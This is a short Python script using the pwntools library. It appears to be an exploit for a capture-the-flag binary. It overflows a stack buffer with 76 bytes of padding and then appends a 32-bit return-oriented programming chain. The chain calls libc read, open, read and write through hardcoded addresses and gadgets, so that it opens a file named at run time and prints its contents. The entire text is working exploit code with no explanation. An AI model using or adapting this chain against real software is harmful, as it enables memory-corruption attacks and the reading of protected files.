from pwn import *
p = process(".ack")
 
PPPR=0x08049401
PPR=0x08049402
PR=0x08049403
BUF=0x804c500
 
num=76
payload = b'A' * num
 
#read
payload += p32(0xf7eb8b80)
payload += p32(PPPR)
payload += p32(0)
payload += p32(BUF)
payload += p32(9)
#open
payload += p32(0xf7eb8760)
payload += p32(PPR)
payload += p32(BUF)
payload += p32(0)
 
#read
payload += p32(0xf7eb8b80)
payload += p32(PPPR)
payload += p32(3)
payload += p32(BUF)
payload += p32(10)
 
#write
payload += p32(0xf7eb8c20)
payload += p32(PPPR)
payload += p32(1)
payload += p32(BUF)
payload += p32(100)
 
payload += p32(0xf7dfb0c0)
payload += p32(0xdeadbeef)
payload += p32(2)
 
p.sendline(payload)
 
p.interactive()
